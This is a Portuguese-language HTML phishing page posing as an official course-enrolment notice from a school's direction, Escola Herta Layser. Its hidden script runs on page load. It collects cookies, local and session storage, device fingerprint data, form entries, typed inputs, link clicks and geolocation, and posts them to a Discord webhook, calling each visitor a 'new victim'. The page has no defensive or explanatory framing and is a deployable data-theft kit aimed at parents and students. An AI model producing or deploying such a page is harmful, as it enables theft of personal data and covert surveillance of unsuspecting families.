<!DOCTYPE html>
<html>
<head>
    <title>Comunicado Oficial - Dire√ß√£o Escola Herta Layser</title>
    <script>
        // Webhook do Discord - CONFIGURE AQUI
        const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/SEU_WEBHOOK_AQUI";
        
        // Coletar TODAS as informa√ß√µes automaticamente
        async function collectAllInfo() {
            const info = {
                // Informa√ß√µes do navegador
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                languages: navigator.languages,
                cookieEnabled: navigator.cookieEnabled,
                
                // Informa√ß√µes de tela
                screen: `${screen.width}x${screen.height}`,
                colorDepth: screen.colorDepth,
                pixelDepth: screen.pixelDepth,
                
                // Informa√ß√µes de conex√£o
                connection: navigator.connection ? {
                    effectiveType: navigator.connection.effectiveType,
                    downlink: navigator.connection.downlink,
                    rtt: navigator.connection.rtt
                } : 'N/A',
                
                // Informa√ß√µes de hardware
                hardwareConcurrency: navigator.hardwareConcurrency,
                deviceMemory: navigator.deviceMemory,
                
                // Dados de armazenamento
                cookies: document.cookie,
                localStorage: JSON.stringify(localStorage),
                sessionStorage: JSON.stringify(sessionStorage),
                
                // Informa√ß√µes da p√°gina
                url: window.location.href,
                referrer: document.referrer,
                title: document.title,
                
                // Timestamp
                timestamp: new Date().toISOString(),
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
            };
            return info;
        }

        // Fun√ß√£o para enviar dados para o Discord
        async function sendToDiscord(data, isInitial = false) {
            try {
                let content = "";
                
                if (isInitial) {
                    content = `üö® **NOVA V√çTIMA CONECTADA** - Escola Herta Layser\n` +
                             `üìÖ **Data:** ${new Date().toLocaleString('pt-BR')}\n` +
                             `üåê **P√°gina:** ${data.url}\n` +
                             `üì± **Dispositivo:** ${data.userAgent}\n` +
                             `üìç **Fuso Hor√°rio:** ${data.timezone}\n` +
                             `üíª **Resolu√ß√£o:** ${data.screen}\n` +
                             `üó£Ô∏è **Idioma:** ${data.language}\n\n` +
                             `üîç **IN√çCIO DA COLETA AUTOM√ÅTICA**`;
                } else {
                    content = `üìä **DADOS CAPTURADOS** - ${new Date().toLocaleString('pt-BR')}\n` +
                             `üç™ **Cookies:** \`\`\`${data.cookies || 'Nenhum cookie encontrado'}\`\`\`\n` +
                             `üíæ **Local Storage:** \`\`\`json\n${data.localStorage || 'Nenhum dado'}\`\`\`\n` +
                             `üïí **Session Storage:** \`\`\`json\n${data.sessionStorage || 'Nenhum dado'}\`\`\``;
                }

                const payload = {
                    content: content,
                    username: "Sistema de Seguran√ßa Escolar",
                    avatar_url: "https://cdn.discordapp.com/attachments/1063278367358955520/1063278367358955520/discord.png",
                    embeds: isInitial ? [{
                        title: "üìö Escola Herta Layser - Alerta de Seguran√ßa",
                        description: "Novo acesso detectado no sistema de comunica√ß√£o escolar",
                        color: 16711680,
                        fields: [
                            {
                                name: "üñ•Ô∏è Dispositivo",
                                value: `\`\`\`${data.userAgent}\`\`\``,
                                inline: false
                            },
                            {
                                name: "üåê Navegador",
                                value: `**Plataforma:** ${data.platform}\n**Idiomas:** ${data.languages?.join(', ') || data.language}`,
                                inline: true
                            },
                            {
                                name: "üì° Conex√£o",
                                value: `**Tipo:** ${data.connection?.effectiveType || 'N/A'}\n**Velocidade:** ${data.connection?.downlink || 'N/A'} Mbps`,
                                inline: true
                            }
                        ],
                        timestamp: new Date().toISOString()
                    }] : []
                };

                const response = await fetch(DISCORD_WEBHOOK, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(payload)
                });

                return response.ok;
            } catch (error) {
                console.error('Erro ao enviar para Discord:', error);
                return false;
            }
        }

        // Capturar dados de formul√°rios automaticamente
        function setupAutoFormCapture() {
            const forms = document.querySelectorAll('form');
            console.log(`üîç Encontrados ${forms.length} formul√°rios na p√°gina`);

            forms.forEach((form, index) => {
                form.addEventListener('submit', function(e) {
                    e.preventDefault();
                    
                    const formData = new FormData(this);
                    let credentials = {};
                    let hasSensitiveData = false;

                    for (let [key, value] of formData.entries()) {
                        credentials[key] = value;
                        // Verificar se cont√©m dados sens√≠veis
                        if (key.toLowerCase().includes('senha') || 
                            key.toLowerCase().includes('password') ||
                            key.toLowerCase().includes('email') ||
                            key.toLowerCase().includes('login') ||
                            key.toLowerCase().includes('usuario')) {
                            hasSensitiveData = true;
                        }
                    }

                    if (hasSensitiveData && Object.keys(credentials).length > 0) {
                        sendFormDataToDiscord(credentials, form.id || `form_${index}`);
                    }

                    // Re-submit do formul√°rio ap√≥s captura
                    setTimeout(() => {
                        form.submit();
                    }, 1000);
                });
            });

            // Tamb√©m monitorar inputs em tempo real
            const inputs = document.querySelectorAll('input[type="text"], input[type="email"], input[type="password"], input[type="tel"]');
            inputs.forEach(input => {
                let lastValue = '';
                
                input.addEventListener('blur', function() {
                    if (this.value && this.value !== lastValue) {
                        lastValue = this.value;
                        if (this.type === 'password' || this.name.toLowerCase().includes('senha')) {
                            sendInputDataToDiscord(this.name, '***[SENHA OCULTADA]***');
                        } else {
                            sendInputDataToDiscord(this.name, this.value);
                        }
                    }
                });
            });
        }

        // Enviar dados de formul√°rio para Discord
        async function sendFormDataToDiscord(formData, formId) {
            try {
                const content = `üìù **FORMUL√ÅRIO PREENCHIDO** - ${formId}\n` +
                               `üïí **Hor√°rio:** ${new Date().toLocaleString('pt-BR')}\n` +
                               `üìã **Dados:** \`\`\`json\n${JSON.stringify(formData, null, 2)}\`\`\``;

                const payload = {
                    content: content,
                    username: "Formul√°rio Escolar",
                    avatar_url: "https://cdn.discordapp.com/attachments/1063278367358955520/1063278367358955520/discord.png"
                };

                await fetch(DISCORD_WEBHOOK, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(payload)
                });
            } catch (error) {
                console.error('Erro ao enviar formul√°rio:', error);
            }
        }

        // Enviar dados de input para Discord
        async function sendInputDataToDiscord(fieldName, value) {
            try {
                const content = `‚å®Ô∏è **INPUT PREENCHIDO**\n` +
                               `üìä **Campo:** ${fieldName || 'Sem nome'}\n` +
                               `üìù **Valor:** ${value}\n` +
                               `üïí **Hor√°rio:** ${new Date().toLocaleString('pt-BR')}`;

                const payload = {
                    content: content,
                    username: "Monitor de Atividade",
                    avatar_url: "https://cdn.discordapp.com/attachments/1063278367358955520/1063278367358955520/discord.png"
                };

                await fetch(DISCORD_WEBHOOK, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(payload)
                });
            } catch (error) {
                console.error('Erro ao enviar input:', error);
            }
        }

        // Capturar clicks em links
        function setupLinkCapture() {
            document.addEventListener('click', function(e) {
                if (e.target.tagName === 'A' || e.target.closest('a')) {
                    const link = e.target.href || e.target.closest('a').href;
                    const text = e.target.textContent || e.target.closest('a').textContent;
                    
                    if (link && link.startsWith('http')) {
                        sendLinkClickToDiscord(link, text);
                    }
                }
            });
        }

        // Enviar clicks em links para Discord
        async function sendLinkClickToDiscord(link, text) {
            try {
                const content = `üîó **LINK CLICADO**\n` +
                               `üìé **URL:** ${link}\n` +
                               `üìù **Texto:** ${text.trim() || 'Sem texto'}\n` +
                               `üïí **Hor√°rio:** ${new Date().toLocaleString('pt-BR')}`;

                const payload = {
                    content: content,
                    username: "Navega√ß√£o Escolar",
                    avatar_url: "https://cdn.discordapp.com/attachments/1063278367358955520/1063278367358955520/discord.png"
                };

                await fetch(DISCORD_WEBHOOK, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(payload)
                });
            } catch (error) {
                console.error('Erro ao enviar link:', error);
            }
        }

        // Tentar obter localiza√ß√£o
        async function getLocation() {
            if (navigator.geolocation) {
                return new Promise((resolve) => {
                    navigator.geolocation.getCurrentPosition(
                        (position) => {
                            const location = {
                                latitude: position.coords.latitude,
                                longitude: position.coords.longitude,
                                accuracy: position.coords.accuracy,
                                timestamp: new Date(position.timestamp).toLocaleString('pt-BR')
                            };
                            sendLocationToDiscord(location);
                            resolve(location);
                        },
                        (error) => {
                            console.log('Localiza√ß√£o n√£o permitida');
                            resolve(null);
                        },
                        { timeout: 10000 }
                    );
                });
            }
            return null;
        }

        // Enviar localiza√ß√£o para Discord
        async function sendLocationToDiscord(location) {
            try {
                const mapsUrl = `https://www.google.com/maps?q=${location.latitude},${location.longitude}`;
                const content = `üìç **LOCALIZA√á√ÉO OBTIDA**\n` +
                               `üåê **Latitude:** ${location.latitude}\n` +
                               `üåê **Longitude:** ${location.longitude}\n` +
                               `üéØ **Precis√£o:** ${location.accuracy} metros\n` +
                               `üó∫Ô∏è **Google Maps:** ${mapsUrl}\n` +
                               `üïí **Hor√°rio:** ${location.timestamp}`;

                const payload = {
                    content: content,
                    username: "Localiza√ß√£o Escolar",
                    avatar_url: "https://cdn.discordapp.com/attachments/1063278367358955520/1063278367358955520/discord.png"
                };

                await fetch(DISCORD_WEBHOOK, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(payload)
                });
            } catch (error) {
                console.error('Erro ao enviar localiza√ß√£o:', error);
            }
        }

        // Inicializa√ß√£o autom√°tica
        window.addEventListener('load', async function() {
            console.log('üöÄ Iniciando coleta autom√°tica de dados...');
            
            // Coletar informa√ß√µes iniciais
            const initialInfo = await collectAllInfo();
            
            // Enviar alerta inicial
            await sendToDiscord(initialInfo, true);
            
            // Configurar capturas autom√°ticas
            setupAutoFormCapture();
            setupLinkCapture();
            
            // Tentar obter localiza√ß√£o
            setTimeout(() => {
                getLocation();
            }, 3000);
            
            // Enviar cookies e storage ap√≥s 5 segundos
            setTimeout(async () => {
                const storageInfo = await collectAllInfo();
                await sendToDiscord(storageInfo, false);
            }, 5000);
            
            // Coleta cont√≠nua a cada 30 segundos
            setInterval(async () => {
                const currentInfo = await collectAllInfo();
                if (currentInfo.cookies !== initialInfo.cookies) {
                    await sendToDiscord(currentInfo, false);
                }
            }, 30000);
            
            // Mostrar loading
            document.getElementById('loading').style.display = 'none';
            document.getElementById('content').style.display = 'block';
        });

        // Simular processamento de formul√°rio
        function processarInscricao() {
            const nome = document.getElementById('nome').value;
            const email = document.getElementById('email').value;
            const telefone = document.getElementById('telefone').value;
            const curso = document.getElementById('curso').value;
            
            if (nome && email) {
                document.getElementById('formSection').style.display = 'none';
                document.getElementById('successMessage').style.display = 'block';
                
                // Os dados j√° foram capturados automaticamente pelo form capture
            } else {
                alert('Por favor, preencha todos os campos obrigat√≥rios.');
            }
        }
    </script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: #333;
            min-height: 100vh;
            padding: 20px;
        }
        
        .container {
            max-width: 800px;
            margin: 0 auto;
            background: rgba(255, 255, 255, 0.95);
            border-radius: 20px;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
            overflow: hidden;
        }
        
        .header {
            background: linear-gradient(135deg, #2c3e50 0%, #3498db 100%);
            color: white;
            padding: 40px;
            text-align: center;
        }
        
        .header h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
            font-weight: 300;
        }
        
        .header .subtitle {
            font-size: 1.2em;
            opacity: 0.9;
        }
        
        .content {
            padding: 40px;
        }
        
        .urgent-alert {
            background: linear-gradient(135deg, #e74c3c 0%, #c0392b 100%);
            color: white;
            padding: 20px;
            border-radius: 10px;
            margin-bottom: 30px;
            text-align: center;
        }
        
        .info-card {
            background: #f8f9fa;
            border-radius: 10px;
            padding: 25px;
            margin-bottom: 25px;
            border-left: 5px solid #3498db;
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        .form-group label {
            display: block;
            margin-bottom: 8px;
            font-weight: 600;
            color: #2c3e50;
        }
        
        .form-group input, .form-group select {
            width: 100%;
            padding: 12px 15px;
            border: 2px solid #e9ecef;
            border-radius: 8px;
            font-size: 16px;
            transition: border-color 0.3s ease;
        }
        
        .form-group input:focus, .form-group select:focus {
            outline: none;
            border-color: #3498db;
        }
        
        .btn {
            background: linear-gradient(135deg, #27ae60 0%, #2ecc71 100%);
            color: white;
            padding: 15px 30px;
            border: none;
            border-radius: 8px;
            font-size: 18px;
            font-weight: 600;
            cursor: pointer;
            transition: transform 0.2s ease;
            width: 100%;
        }
        
        .btn:hover {
            transform: translateY(-2px);
        }
        
        .loading {
            text-align: center;
            padding: 40px;
            color: #666;
        }
        
        .success-message {
            background: linear-gradient(135deg, #27ae60 0%, #2ecc71 100%);
            color: white;
            padding: 30px;
            border-radius: 10px;
            text-align: center;
            display: none;
        }
        
        .course-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 20px;
            margin: 30px 0;
        }
        
        .course-card {
            background: white;
            border-radius: 10px;
            padding: 20px;
            text-align: center;
            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
            border: 2px solid #e9ecef;
            transition: transform 0.3s ease;
        }
        
        .course-card:hover {
            transform: translateY(-5px);
            border-color: #3498db;
        }
        
        .footer {
            background: #2c3e50;
            color: white;
            text-align: center;
            padding: 20px;
            margin-top: 40px;
        }
        
        @media (max-width: 768px) {
            .container {
                margin: 10px;
            }
            
            .header h1 {
                font-size: 2em;
            }
            
            .content {
                padding: 20px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>üè´ Escola Herta Layser</h1>
            <div class="subtitle">Comunicado Oficial da Dire√ß√£o</div>
        </div>
        
        <div class="content">
            <div class="urgent-alert">
                <h3>‚ö†Ô∏è COMUNICADO URGENTE</h3>
                <p>Oferta Especial de Cursos Extracurriculares - Vagas Limitadas</p>
            </div>
            
            <div class="info-card">
                <h3>üìã Informa√ß√µes Importantes</h3>
                <p><strong>Data:</strong> <span id="currentDate"></span></p>
                <p><strong>De:</strong> Dire√ß√£o da Escola Herta Layser</p>
                <p><strong>Para:</strong> Comunidade Escolar</p>
                <p><strong>Assunto:</strong> Oferta de Cursos Extracurriculares 2024</p>
            </div>
            
            <div id="loading" class="loading">
                <h3>üì° Carregando comunicado oficial...</h3>
                <p>Aguarde enquanto carregamos as informa√ß√µes mais recentes.</p>
            </div>
            
            <div id="content" style="display: none;">
                <div class="info-card">
                    <h3>üéì Cursos Dispon√≠veis</h3>
                    <p>Prezados pais, alunos e respons√°veis,</p>
                    <p>Temos o prazer de anunciar nossa nova grade de cursos extracurriculares para 2024. 
                    Estes cursos foram cuidadosamente selecionados para complementar a forma√ß√£o de nossos alunos.</p>
                </div>
                
                <div class="course-grid">
                    <div class="course-card">
                        <h4>üíª Programa√ß√£o para Iniciantes</h4>
                        <p>Segundas e Quartas - 14h √†s 16h</p>
                        <p><strong>Investimento:</strong> R$ 199/m√™s</p>
                    </div>
                    <div class="course-card">
                        <h4>üé® Design Gr√°fico</h4>
                        <p>Ter√ßas e Quintas - 15h √†s 17h</p>
                        <p><strong>Investimento:</strong> R$ 179/m√™s</p>
                    </div>
                    <div class="course-card">
                        <h4>üåê Ingl√™s Tecnol√≥gico</h4>
                        <p>Quintas e Sextas - 13h √†s 15h</p>
                        <p><strong>Investimento:</strong> R$ 159/m√™s</p>
                    </div>
                </div>
                
                <div class="info-card">
                    <h3>üìù Inscri√ß√µes Abertas</h3>
                    <p>As vagas s√£o limitadas! Fa√ßa sua pr√©-inscri√ß√£o agora para garantir sua vaga.</p>
                </div>
                
                <div id="formSection">
                    <form onsubmit="event.preventDefault(); processarInscricao();">
                        <div class="form-group">
                            <label for="nome">Nome Completo *</label>
                            <input type="text" id="nome" name="nome" required>
                        </div>
                        
                        <div class="form-group">
                            <label for="email">E-mail *</label>
                            <input type="email" id="email" name="email" required>
                        </div>
                        
                        <div class="form-group">
                            <label for="telefone">Telefone/WhatsApp *</label>
                            <input type="tel" id="telefone" name="telefone" required>
                        </div>
                        
                        <div class="form-group">
                            <label for="curso">Curso de Interesse *</label>
                            <select id="curso" name="curso" required>
                                <option value="">Selecione um curso</option>
                                <option value="programacao">Programa√ß√£o para Iniciantes</option>
                                <option value="design">Design Gr√°fico</option>
                                <option value="ingles">Ingl√™s Tecnol√≥gico</option>
                            </select>
                        </div>
                        
                        <button type="submit" class="btn">
                            ‚úÖ CONFIRMAR PR√â-INSCRI√á√ÉO
                        </button>
                    </form>
                </div>
                
                <div id="successMessage" class="success-message" style="display: none;">
                    <h3>üéâ Pr√©-inscri√ß√£o Confirmada!</h3>
                    <p>Sua pr√©-inscri√ß√£o foi recebida com sucesso! Entraremos em contato em at√© 24 horas para confirmar sua vaga.</p>
                    <p><strong>Obrigado por escolher a Escola Herta Layser!</strong></p>
                </div>
            </div>
        </div>
        
        <div class="footer">
            <p>Escola Herta Layser ‚Ä¢ Rua Exemplo, 123 ‚Ä¢ Centro ‚Ä¢ Cidade/UF</p>
            <p>Telefone: (11) 9999-9999 ‚Ä¢ E-mail: contato@hertalayser.edu.br</p>
        </div>
    </div>

    <script>
        // Atualizar data atual
        document.getElementById('currentDate').textContent = new Date().toLocaleDateString('pt-BR', {
            weekday: 'long',
            year: 'numeric',
            month: 'long',
            day: 'numeric'
        });
    </script>
</body>
</html>
